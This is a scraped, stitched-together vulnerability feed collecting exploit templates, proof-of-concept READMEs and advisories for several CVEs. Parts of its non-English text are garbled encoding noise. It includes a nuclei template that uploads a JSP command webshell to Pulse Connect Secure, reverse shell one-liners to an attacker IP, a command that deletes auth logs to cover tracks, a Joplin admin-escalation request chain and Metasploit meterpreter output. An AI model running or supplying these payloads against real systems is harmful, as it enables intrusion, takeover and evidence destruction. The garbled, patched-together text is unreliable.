Intel Mac OS X 10_15_7)" - "Mozilla/5.0 (X11; Linux x86_64)" - "curl/7.68.0" - "Wget/1.20.3 (linux-gnu)" body: | { "platform": "{{payload}}", "name": "{{payload}}", "desc": "{{payload}}" } attack: pitchfork stop-at-first-match: true matchers-condition: and matchers: - type: word part: body condition: or words: - "uid=" - "gid=" - "root" - "admin" - type: status status: - 200 extractors: - type: regex part: body regex: - "uid=.*?gid=.*" - "root:.*?:[0-9]+:[0-9]+"

This template attempts to trigger the vulnerability using a 300-character 'A' payload in the AuthHash, and detects success based on known server error strings and FortiVoice headers. reference: - https://nvd.nist.gov/vuln/detail/CVE-2025-32756 - https://fortiguard.fortinet.com/psirt/FG-IR-25-254 - https://github.com/projectdiscovery/nuclei-templates/pull/12322 classification: cve-id: CVE-2025-32756 cwe-id: CWE-121 metadata: verified: true max-request: 1 vendor: fortinet product: fortivoice shodan-query: http.title:"FortiVoice" fofa-query: body="FortiVoice" tags: - cve - cve2025 - fortinet - fortivoice - rce - overflow - intrusive - auth-bypassrequests: - method: POST path: - "{{BaseURL}}/remote/hostcheck_validate" headers: Cookie: "AuthHash=enc={{repeat('A', 300)}}" User-Agent: nuclei-scanner matchers-condition: or matchers: - type: status status: - 500 - type: word part: body words: - "buffer overflow" - "Segmentation fault" - "core dumped" - "backtrace" - "stack smashing" condition: or - type: word part: header words: - "FortiVoice" extractors: - type: regex part: body regex: - "(?i)(segmentation fault|stack smashing|core dumped|backtrace)"

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Next.js Middleware Bypass Vulnerability æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-29927 æ¼æ´ç±»å‹ï¼š æƒé™ç»•è¿‡ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Next.jsä¸­å­˜åœ¨ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼ˆCVE-2025-29927ï¼‰ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ“çºµå†…éƒ¨æ ‡å¤´x-middleware-subrequestæ¥ç»•è¿‡ä¸­é—´ä»¶çš„å®‰å…¨æ£€æŸ¥ï¼Œä»è€Œè·å¾—å¯¹å—ä¿æŠ¤è·¯ç”±çš„æœªæˆæƒè®¿é—®ã€‚å½±å“ç‰ˆæœ¬åŒ…æ‹¬11.1.4è‡³12.3.4ã€13.0.0è‡³13.5.8ã€14.0.0è‡³14.2.24å’Œ15.0.0è‡³15.2.2ã€‚å»ºè®®ç”¨æˆ·æ›´æ–°åˆ°ä¿®å¤ç‰ˆæœ¬æˆ–å®æ–½äºŒæ¬¡éªŒè¯ä»¥é˜²æ­¢æ­¤æ¼æ´ã€‚ äº§å“å‚å•†ï¼š Next.js äº§å“åç§°ï¼š Next.js å½±å“ç‰ˆæœ¬ï¼š 11.1.4 - 12.3.4, 13.0.0 - 13.5.8, 14.0.0 - 14.2.24, 15.0.0 - 15.2.2 æ¥æºï¼š https://github.com/KamalideenAK/poc-cve-2025-29927 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ .eslintrc.json .gitignore README.md app exploit.js middleware.ts next.config.js package-lock.json package.json public tailwind.config.ts tsconfig.json æ¥æºæ¦‚è¿°Next.js Middleware Bypass (CVE-2025-29927) Proof of ConceptThis repository contains a proof of concept (POC) for CVE-2025-29927, a critical vulnerability in Next.js that allows attackers to bypass authorization checks implemented in middleware. ğŸ“‹ Table of Contents Running the POC Application Using the Exploit Script How to Fix the Vulnerability Vulnerability Details Running the POC ApplicationThis Next.js application demonstrates the vulnerability with a protected dashboard route. Setup Instructions Clone the repository Install and run: 123npm installnpm run buildnpm run start Access http://localhost:3000 in your browser Try accessing the protected dashboard at /dashboard Using the Exploit ScriptThe exploit script can test any Next.js application for this vulnerability. Usage1npm run exploit <target-url> Example1npm run exploit http://localhost:3000/dashboard How it WorksThe exploit tool: Takes a target URL as input Makes a normal request to check if the route is protected Attempts to bypass middleware using the x-middleware-subrequest header Compares responses to determine vulnerability Sample Output123456789=== Next.js CVE-2025-29927 Middleware Bypass Tester ===Target: http://localhost:3000/dashboardTesting vulnerability...Normal request status: 307Bypass request status: 200âš ï¸ VULNERABLEThe route is protected but accessible with the bypass header How to Fix the VulnerabilityA fix implementation is available in the how-to-fix branch. Quick Fixes Update Next.js Version (Recommended) Update to one of these patched versions: Next.js 15.x â†’ 15.2.3 Next.js 14.x â†’ 14.2.25 Next.js 13.x â†’ 13.5.9 Next.js 12.x â†’ 12.3.5 Implement Secondary Validation Add authentication checks in your API routes/pages Donâ€™t rely solely on middleware for security Sample Output1234567891011121314=== Next.js CVE-2025-29927 Middleware Bypass Tester ===Target: http://localhost:3000/dashboardTesting vulnerability...Making request without bypass header...Making request with bypass header...Normal request status: 307Bypass request status: 307âœ“ NOT VULNERABLE - Protected RouteThe route is protected and the bypass attempt was unsuccessfulNormal request redirected to: /Bypass request redirected to: / Vulnerability DetailsCVE Information CVE ID: CVE-2025-29927 Affected Versions: 13.0.0 - 13.5.8 14.0.0 - 14.2.24 15.0.0 - 15.2.2 11.1.4 - 12.3.4 DescriptionNext.js uses an internal header x-middleware-subrequest to prevent recursive requests. This vulnerability allows attackers to bypass middleware security checks by manipulating this header. Impact Unauthorized access to protected routes Bypass of authentication checks Circumvention of security middleware Affected Environments Self-hosted Next.js applications using Middleware References Next.js Security Advisory GitHub Security Advisory DisclaimerThis tool is provided for educational and testing purposes only. Only use this tool on systems you own or have explicit permission to test.

Hoáº¡t Ä‘á»™ng trÃªn cÃ¡c phiÃªn báº£n Erlang/OTP SSH server bá»‹ áº£nh hÆ°á»Ÿng (< 27.3.3, < 26.2.5.11, < 25.3.2.20). Gá»­i Ä‘Ãºng Ä‘á»‹nh dáº¡ng SSH binary message theo RFC4253. ğŸ§± Giáº£i nghÄ©a: touch: lá»‡nh trong Unix/Linux dÃ¹ng Ä‘á»ƒ táº¡o file trá»‘ng. /tmp/pwned_by_elaina: Ä‘Æ°á»ng dáº«n Ä‘áº¿n file cáº§n táº¡o trong thÆ° má»¥c /tmp, nÆ¡i mÃ  háº§u háº¿t há»‡ thá»‘ng Linux Ä‘á»u cho phÃ©p ghi. ğŸ§ª Má»¥c Ä‘Ã­ch dÃ¹ng trong exploit: Khi báº¡n cháº¡y payload: python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™thÃ¬: âœ… Náº¿u khai thÃ¡c thÃ nh cÃ´ng, trÃªn mÃ¡y náº¡n nhÃ¢n sáº½ xuáº¥t hiá»‡n file: /tmp/pwned_by_elainağŸš« Náº¿u khÃ´ng xuáº¥t hiá»‡n file nÃ y, cÃ³ thá»ƒ payload bá»‹ cháº·n hoáº·c mÃ¡y khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng. ğŸ” Kiá»ƒm tra káº¿t quáº£: Náº¿u báº¡n cÃ³ shell vÃ o mÃ¡y náº¡n nhÃ¢n, kiá»ƒm tra: ls -l /tmp/pwned_by_elaina ğŸ“Œ TÃ¹y chá»n khÃ¡c: Báº¡n cÃ³ thá»ƒ thay báº±ng báº¥t ká»³ lá»‡nh nÃ o báº¡n muá»‘n, vÃ­ dá»¥: Gá»­i reverse shell: bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 XÃ³a file log: rm -rf /var/log/auth.log ENGLISH ##ğŸ§  Usage suggestions:## Check the generated file: python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™ Reverse shell: python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜bash -i >& /dev/tcp/YOUR_IP/4444 0>&1â€™ ##ğŸ” Note: ## The script does not require an SSH key or password. Works on affected Erlang/OTP SSH server versions (< 27.3.3, < 26.2.5.11, < 25.3.2.20). Send the correct SSH binary message format according to RFC4253. ğŸ§± Explanation: touch: command in Unix/Linux used to create an empty file. /tmp/pwned_by_elaina: path to the file to create in the /tmp directory, where most Linux systems allow writing. ğŸ§ª Purpose of use in exploit: When you run the payload: python3 elaina_cve_2025_32433.py 192.168.1.10 22 â€˜touch /tmp/pwned_by_elainaâ€™then: âœ… If the exploit is successful, the file will appear on the victimâ€™s machine: /tmp/pwned_by_elainağŸš« If this file does not appear, the payload may be blocked or the machine is not affected. ğŸ” Check the result: If you have a shell on the victim machine, check: ls -l /tmp/pwned_by_elaina ğŸ“Œ Other options: You can replace it with any command you want, for example: Send a reverse shell: bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 Delete the log file: rm -rf /var/log/auth.log

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Windows NTLMåå°„SMBæ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-33073 æ¼æ´ç±»å‹ï¼š æƒé™ç»•è¿‡ æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š CVE-2025-33073æ˜¯ä¸€ä¸ªå½±å“Windowsç³»ç»Ÿçš„NTLMåå°„SMBæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´é€šè¿‡åå°„NTLMè®¤è¯æŒ‘æˆ˜æ¥ç»•è¿‡è®¤è¯ï¼Œæœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®æˆ–èµ„æºã€‚æ­¤æ¼æ´æºäºå¯¹è®¤è¯è¯·æ±‚çš„ä¸å½“å¤„ç†ï¼Œå…è®¸æ”»å‡»è€…å°†NTLMè®¤è¯æŒ‘æˆ˜åå°„å›ç›®æ ‡ã€‚è¯¥æ¼æ´çš„ä¸¥é‡æ€§è¢«è¯„ä¼°ä¸ºé«˜å±ï¼Œå½±å“å¤šç§Windowsç‰ˆæœ¬ã€‚æ­¤å­˜å‚¨åº“æä¾›äº†ä¸€ä¸ªæ¦‚å¿µéªŒè¯(PoC)åˆ©ç”¨ä»£ç ï¼Œæ—¨åœ¨æ•™è‚²å’Œæé«˜å¯¹æ­¤å®‰å…¨é—®é¢˜çš„è®¤è¯†ã€‚ äº§å“å‚å•†ï¼š Microsoft äº§å“åç§°ï¼š Windows æ¥æºï¼š https://github.com/joaozixx/CVE-2025-33073 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ CVE-2025-33073.py README.md dnstool.py lib æ¥æºæ¦‚è¿°CVE-2025-33073: PoC Exploit for NTLM Reflection SMB Flaw ğŸš¨ Table of Contents Introduction Overview of the Vulnerability Exploit Details Installation Usage Download the Exploit Contributing License Acknowledgments IntroductionWelcome to the CVE-2025-33073 repository. This project provides a proof-of-concept (PoC) exploit for the NTLM reflection flaw in SMB. This vulnerability can allow an attacker to gain unauthorized access to sensitive information. The purpose of this repository is to educate and raise awareness about this security issue. Overview of the VulnerabilityThe NTLM reflection flaw in SMB is a serious security issue that affects various versions of Windows. Attackers can exploit this vulnerability to authenticate as any user, potentially gaining access to sensitive data or resources. This flaw arises from improper handling of authentication requests, allowing attackers to reflect NTLM authentication challenges back to the target. Key Points: Affected Systems: Various Windows versions Impact: Unauthorized access to resources Severity: High Understanding this vulnerability is crucial for system administrators and security professionals to protect their networks effectively. Exploit DetailsThe exploit targets the NTLM reflection flaw by leveraging specific characteristics of the SMB protocol. By sending crafted requests, the exploit can trigger the vulnerability, allowing an attacker to authenticate without proper credentials. Technical Breakdown: Protocol: SMB (Server Message Block) Vulnerability Type: NTLM Reflection Required Privileges: None This exploit serves as a demonstration of the vulnerability and is intended for educational purposes only. Use it responsibly and ethically. InstallationTo set up the exploit on your machine, follow these steps: Clone the Repository: 1git clone https://github.com/joaozixx/CVE-2025-33073.git Navigate to the Directory: 1cd CVE-2025-33073 Install Dependencies:Ensure you have the required dependencies installed. Use the following command: 1pip install -r requirements.txt UsageOnce the exploit is set up, you can use it to test for the NTLM reflection flaw. Follow these steps: Run the Exploit:Execute the script with the target IP address: 1python exploit.py <target_ip> Monitor the Output:The exploit will provide feedback on the success or failure of the attempt. Log Results:Itâ€™s essential to log the results for further analysis. Important Note:Use this exploit only in a controlled environment where you have permission to test. Unauthorized use may lead to legal consequences. Download the ExploitYou can download the latest version of the exploit from the Releases section. Please ensure you download the correct file and execute it in a safe environment. To view the releases, click the button below: ContributingContributions are welcome! If you would like to contribute to this project, please follow these steps: Fork the Repository: Click the â€œForkâ€ button at the top right corner of the page. Create a New Branch: 1git checkout -b feature/YourFeature Make Your Changes: Implement your changes and test them thoroughly. Commit Your Changes:1git commit -m "Add your message here" Push to Your Branch:1git push origin feature/YourFeature Create a Pull Request: Go to the original repository and click on â€œNew Pull Request.â€ Thank you for considering contributing to this project! LicenseThis project is licensed under the MIT License. See the LICENSE file for more details. AcknowledgmentsWe would like to thank the security community for their ongoing efforts in identifying and addressing vulnerabilities. Special thanks to those who have contributed to the understanding of NTLM reflection flaws and their implications. For more information, visit the Releases section to download the latest files and updates. Feel free to reach out if you have any questions or need assistance with the exploit. Your feedback is valuable in improving this project.

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Grafana è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2024-9264 æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š CVE-2024-9264æ˜¯Grafanaä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡SQLè¡¨è¾¾å¼å’ŒDuckDBåˆ©ç”¨ã€‚æ­¤æ¼æ´å…è®¸æ”»å‡»è€…åœ¨æ˜“å—æ”»å‡»çš„Grafanaå®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ä¿®å¤ç‰ˆæœ¬è§£å†³äº†åŸå§‹PoCä¸­çš„è¯­æ³•é”™è¯¯å’Œwrite_file()å‡½æ•°çš„ä¸æ­£ç¡®ä½¿ç”¨é—®é¢˜ï¼Œå¹¶æˆåŠŸé€šè¿‡shellfsæ‰©å±•å†™å…¥å’Œæ‰§è¡Œåå‘shellã€‚ äº§å“å‚å•†ï¼š Grafana äº§å“åç§°ï¼š Grafana å½±å“ç‰ˆæœ¬ï¼š 11.0.0 æ¥æºï¼š https://github.com/Exerrdev/CVE-2024-9264-Fixed ç±»å‹ï¼š CVE-2024:github search ä»“åº“æ–‡ä»¶ README.md fpoc.py æ¥æºæ¦‚è¿°ğŸ› ï¸ CVE-2024-9264 - Fixed Grafana RCE ExploitThis is a fixed version of the proof-of-concept exploit for CVE-2024-9264, a critical remote code execution vulnerability in Grafana (via SQL expressions and DuckDB). ğŸ”— Original advisory: Grafana Security ReleaseâŒ Original PoC: Broken due to syntax errors and incorrect use of write_file()âœ… This version works, tested on a vulnerable Grafana 11.0.0 instance. âœ… Fixes in this version âœ… Correctly uses writefile() instead of write_file() (DuckDB function) âœ… Proper shell payload using bash -i >& /dev/tcp/... âœ… Reverse shell written and executed successfully via shellfs extension ğŸ“¦ Requirements Grafana instance with: DuckDB backend Ability to install shellfs from community A netcat listener on your attacker machine ğŸš€ Usage123456python3 fixed_poc_writefile.py \ --url http://target:3000 \ --username admin \ --password admin \ --reverse-ip <YOUR_IP> \ --reverse-port 4444 Then listen with: 1nc -lvnp 4444 âš ï¸ Legal DisclaimerThis project is for educational purposes only.Do not use it against targets you do not have permission to test. âœï¸ Author of this FixModified and validated by Exerr â€” original PoC by z3k0sec.

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Pulse Connect Secure Bypass LFI y Remote Code Execution Vulnerability æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2021-22893 æ¼æ´ç±»å‹ï¼š ç›®å½•éå† æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Pulse Connect Secure 9.1R11.4åŠä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨æœªè®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è·¯å¾„éå†æ¼æ´å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ webshellå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ­¤æ¨¡æ¿å°è¯•åœ¨å¤šä¸ªå¸¸è§çš„webå¯è®¿é—®è·¯å¾„ä¸­å†™å…¥JSP webshellï¼Œç„¶åæ‰§è¡Œâ€™idâ€™å‘½ä»¤ä»¥ç¡®è®¤è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ äº§å“å‚å•†ï¼š Pulse Secure äº§å“åç§°ï¼š Pulse Connect Secure å½±å“ç‰ˆæœ¬ï¼š version <= 9.1R11.4 æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/blob/41485124568acfbbf861dd3a329f0848d5de3969/http%2Fcves%2F2021%2FCVE-2021-22893.yaml ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues POCè¯¦æƒ…12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879id: cve-2021-22893info: name: Pulse Connect Secure - Bypass LFI y Remote Code Execution (CVE-2021-22893) author: MammaniNelsonD (P4IM0N) severity: critical description: | Pulse Connect Secure 9.1R11.4 y versiones inferiores son vulnerables a una ejecuciâ”œâ”‚n de câ”œâ”‚digo remota no autenticada. Un atacante puede aprovechar una vulnerabilidad de Path Traversal para escribir archivos arbitrarios, lo que conduce a RCE al cargar una webshell. Esta plantilla intenta escribir una webshell JSP en varias rutas comunes accesibles desde la web y luego ejecuta el comando 'id' para confirmar el RCE. reference: - https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784 - https://nvd.nist.gov/vuln/detail/CVE-2021-22893 - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22893.yaml - https://attackerkb.com/topics/23p4wVqVad/cve-2021-22893/rapid7-analysis classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2021-22893 cwe-id: CWE-22 metadata: max-requests: 8 tags: cve,cve2021,pulse,rce,traversal,unauth,webshell,intrusiverequests: - raw: - | POST /dana-na/jam/get_file.cgi?pass=1&file_name=../../../../..{{web_path}}{{shell_name}}&v=2.4 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: */* Connection: close Content-Type: application/octet-stream Content-Length: {{len(webshell_body)}} {{webshell_body}} - | GET {{web_path}}{{shell_name}}?cmd=id HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: */* Connection: close attack: clusterbomb payloads: web_path: - "/dana/html5acc/guacamole/ui/" - "/dana-na/help/" - "/dana-cached/help/" - "/dana/meeting/" shell_name: - "{{randstr}}.jsp" webshell_body: - '<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); DataInputStream dis = new DataInputStream(p.getInputStream()); String line; while ((line = dis.readLine()) != null) { out.println(line); } p.destroy(); }%>' stop-at-first-match: true req-condition: true matchers-condition: and matchers: - type: status part: header_1 status: - 200 - type: regex part: body_1 regex: - "uid=[0-9(].*gid=[0-9(].*" extractors: - type: regex part: body_1 group: 1 name: rce_output regex: - "(uid=.*)"

Victim: PHP 7.2.19, on Nginx 1.14.2 with FPM Attacker: Metasploit Framework v6.4.45-dev, using module exploit/multi/http/php_fpm_rce -> Exploit worked reliable on older Metasploit versions Expected behaviorDefault settings, default target (PHP), default payload (meterpreter/reverse_tcp)During check phase, the max payload length is determined being 1760 bytesPayload gets sent and a meterpreter shell is opened Current behaviorDuring check phase, max payload length is determined being 1760 bytesThen payload is prepared and encoded via the new default PHP encoder â€œHEXâ€, which is larger (2270 bytes), making the exploit fail Metasploit versionv6.4.45-dev Additional InformationOutput: msf6 exploit(multi/http/php_fpm_rce) > run[*] Started reverse TCP handler on 10.11.14.240:4444[*] Sending baseline queryâ€¦[*] Detecting QSLâ€¦[+] The target is probably vulnerable. Possible QSLs: [1765][*] Doing sanity checkâ€¦[*] Detecting attack parametersâ€¦[+] Parameters found: QSL=1760, customh_length=31[+] Target is vulnerable![*] Performing attack using php.ini settingsâ€¦[+] Success! Was able to execute a command by appending â€˜which whichâ€™[*] Trying to cleanup /tmp/yâ€¦[+] Cleanup done![*] Sending payloadâ€¦[-] Exploit aborted due to failure: unknown: QSL value too small to fit the command: QSL=1760, qsl_delta=0, prefix (size=2270)=W=php%20-r%20%22eval(hex2bin(%%22));%22%26[*] Exploit completed, but no session was created.

It initiates an SSL connection to the target server and sends a HEAD request. It initiates an SSL connection to the target server and sends a HEAD request. If the response suggests that SSL certificate verification is improperly handled, the server might be vulnerable. ğŸš€ Featuresâœ… Supports full URLs or plain IPs with optional ports âœ… Automatically parses and defaults to port 443 if not specified âœ… Ignores SSL certificate errors (for test purposes) âœ… Minimal and fast detection logic âœ… Clear output indicating possible vulnerability ğŸ›  Usagepython CVE-2024-40898.py -u https://192.168.1.1:443You can also just pass an IP: python CVE-2024-40898.py -u 192.168.1.1âš ï¸ DisclaimerThis script is for educational and authorized security testing only. Do not use on systems you do not own or have explicit permission to test.

posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-gxqj-2gvr-3p2f CVSS è¯„åˆ†ï¼š 9.1 å‚è€ƒé“¾æ¥ï¼š https://nvd.nist.gov/vuln/detail/CVE-2025-6065 https://plugins.trac.wordpress.org/browser/image-resizer-on-the-fly/trunk/image-resizer-on-the-fly.php#L25 https://wordpress.org/plugins/image-resizer-on-the-fly https://www.wordfence.com/threat-intel/vulnerabilities/id/14877ff6-e393-41a3-91c1-fe7f477297cc?source=cve https://github.com/advisories/GHSA-gxqj-2gvr-3p2f æè¿°ï¼š The Image Resizer On The Fly plugin for WordPress is vulnerable to arbitrary file deletion due to insufficient file path validation in the â€˜deleteâ€™ task in all versions up to, and including, 1.1. This makes it possible for unauthenticated attackers to delete arbitrary files on the server, which can easily lead to remote code execution when the right file is deleted (such as wp-config.php).

posts.title: Online Appointment Booking System Reflected XSS Vulnerability
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Online Appointment Booking System Reflected XSS Vulnerability æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-46181 æ¼æ´ç±»å‹ï¼š è·¨ç«™å¯æ‰§è¡Œè„šæœ¬ æ¼æ´ç­‰çº§ï¼š ä¸­å± æ¼æ´æè¿°ï¼š åœ¨çº¿é¢„çº¦é¢„è®¢ç³»ç»Ÿ(v1.0)ä¸­å­˜åœ¨åå°„å‹è·¨ç«™è„šæœ¬(XSS)æ¼æ´ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†é¢„çº¦ç¡®è®¤çš„é¡µé¢ä¸­ã€‚ä¸€ä¸ªGETå‚æ•°æœªèƒ½æ­£ç¡®æ¸…ç†è¾“å…¥ï¼Œä½¿å¾—å¯ä»¥åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ³¨å…¥å¹¶æ‰§è¡ŒJavaScriptä»£ç ã€‚ äº§å“åç§°ï¼š Online Appointment Booking System å½±å“ç‰ˆæœ¬ï¼š v1.0 æ¥æºï¼š https://github.com/shemkumar/CVE-2025-46181-XSS ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ DISCLAIMER.md LICENSE README.md poc.py æ¥æºæ¦‚è¿°CVE-2025-46181 - Reflected XSS in an Online Appointment Booking SystemCVE-ID: CVE-2025-46181Discovered by: Shemkumar P (shemkumar.github.io)Vulnerability Type: Reflected Cross-Site Scripting (XSS)Severity: MediumStatus: Disclosed, CVE Assigned by MITRE âœ¨ DescriptionA Reflected Cross-Site Scripting (XSS) vulnerability exists in a public online appointment booking system (v1.0), specifically in the page that handles appointment confirmation. A GET parameter fails to sanitize input properly, enabling JavaScript injection and code execution in the victimâ€™s browser. ğŸ“ Vulnerable Parameter1GET /confirmapp.php?slotdt=<payload> Example Payload (Encoded): 1<script>alert("XSS")</script> ğŸ’¥ Proof of Concept (PoC)1<script>alert("You have been hijacked")</script> ğŸš« Live link redacted for ethical reasons. This vulnerability was tested in a controlled environment. âš™ï¸ Python PoC Script123456789101112131415161718import requestsfrom urllib.parse import quotebase_url = "https://[REDACTED]/confirmapp.php"payload = '<script>alert("XSS triggered")</script>'params = { 'fullname': 'test', 'mobile': '9999999999', 'emailid': 'test@example.com', 'slotdt': payload, 'slottime': '11:00:00', 'doctorid': '2'}encoded = '&'.join(f"{k}={quote(str(v))}" for k, v in params.items())print("Test URL (use only in authorized test environments):")print(f"{base_url}?{encoded}") ğŸ›¡ï¸ Impact Arbitrary JavaScript execution Potential session hijacking Clickjacking or phishing redirection Targeted attacks through crafted links ğŸ§ª RemediationThe application should: Escape user inputs using htmlspecialchars() in PHP Use a Content Security Policy (CSP) Sanitize user data at both client and server sides ğŸ“œ Timeline Discovered: May 2025 CVE Assigned by MITRE: June 2025 Public Release: June 2025 ğŸ§‘â€ğŸ’» AuthorShemkumar PğŸ•¸ï¸ shemkumar.github.ioğŸ” Cybersecurity Researcher | CTF Enthusiast | CVE Reporter âš ï¸ This publication is for educational and defensive use only. Testing or exploiting vulnerabilities on systems you donâ€™t own or have explicit permission for is illegal and unethical.

This enables unauthorized users to gain admin access. The issue is fixed in version 3.3.3. reference: - https://github.com/laurent22/joplin/security/advisories/GHSA-xj67-649m-3p8x - https://nvd.nist.gov/vuln/detail/CVE-2025-27134 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H cvss-score: 8.8 cve-id: CVE-2025-27134 cwe-id: CWE-284 metadata: verified: true shodan-query: 'title:"Joplin Server"' tags: cve,cve2025,auth,joplin,oss,default-loginhttp: - raw: - | POST /api/sessions HTTP/1.1 Host: {{Hostname}} Content-Type: application/json { "email": "{{email}}", "password": "{{password}}" } - | PATCH /api/users/{{user_id}} HTTP/1.1 Host: {{Hostname}} Cookie: sessionId={{session_id}} Content-Type: application/json { "is_admin": 1 } - | GET /api/users HTTP/1.1 Host: {{Hostname}} Cookie: sessionId={{session_id}} Content-Type: application/json payloads: email: - admin@localhost password: - admin attack: clusterbomb matchers: - type: dsl dsl: - 'status_code == 200' - 'contains(body_1,"user_id") && contains(body_1,"id")' - contains(user, "{{user_id}}") condition: and extractors: - type: json part: body_1 name: user_id json: - '.user_id' internal: true - type: json part: body_1 name: session_id json: - '.id' internal: true - type: json name: user part: body_3 json: - '.items[] | select(.is_admin == 1) | .id'

posts.title: Timetrax V1 (2025) è¿œç¨‹ä»£ç æ‰§è¡Œå’Œæƒé™æå‡æ¼æ´
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Timetrax V1 (2025) è¿œç¨‹ä»£ç æ‰§è¡Œå’Œæƒé™æå‡æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-46157 æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š åœ¨Timetrax V1 (2025)ä¸­å‘ç°äº†ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œå…è®¸è®¤è¯ç”¨æˆ·ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶å¹¶å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)ã€‚é—®é¢˜å­˜åœ¨äºè€ƒå‹¤æ¨¡å—çš„è¯·å‡è¯·æ±‚è¡¨å•ä¸­ï¼ŒæœåŠ¡å™¨ç«¯éªŒè¯è–„å¼±ï¼Œå…è®¸é€šè¿‡ä¿®æ”¹è¯·æ±‚ä¸Šä¼ æ¶æ„çš„.asp web shellã€‚è¿›ä¸€æ­¥çš„åˆ©ç”¨å…è®¸é€šè¿‡æ»¥ç”¨SeImpersonatePrivilegeä½¿ç”¨EfsPotatoæŠ€æœ¯æå‡æƒé™è‡³SYSTEMã€‚ äº§å“å‚å•†ï¼š Timetrax äº§å“åç§°ï¼š Timetrax V1 å½±å“ç‰ˆæœ¬ï¼š 2025 æ¥æºï¼š https://github.com/morphine009/CVE-2025-46157 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ README.md æ¥æºæ¦‚è¿°CVE-2025-46157CVE-2025-46157 â€“ Timetrax V1 (2025) Remote Code Execution and Privilege EscalationSummaryA critical vulnerability was discovered in Timetrax V1 (2025) that allows authenticated users to bypass file upload restrictions and achieve remote code execution (RCE). The issue exists in the Leave Request form of the Attendance module, where weak server-side validation permits the upload of malicious .asp web shells via modified requests. Further exploitation allows privilege escalation to SYSTEM using the EfsPotato technique by abusing the SeImpersonatePrivilege. Vulnerability Detailsâœ… Remote Code Execution (RCE) Component: Leave Request form in Attendance module Cause: Insecure server-side file validation Attack Vector: Modify upload request to change .txt to .asp Impact: Full command execution on the server âœ… Privilege Escalation Technique: EfsPotato Privilege Misuse: SeImpersonatePrivilege Result: SYSTEM-level access AV Evasion: Achieved using obfuscated payloads CVSS v3.1 ScoreBase Score: 9.9 (Critical)Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H Proof of Concept (PoC)1. Remote Code Execution Login to Timetrax with valid user credentials. Go to the Leave Request form under the Attendance module. Upload a .txt file, intercept the HTTP request using Burp Suite. Modify the file extension in the request from .txt to .asp. Forward the request. The server will return a URL to the uploaded file. Visit the URL to trigger the malicious web 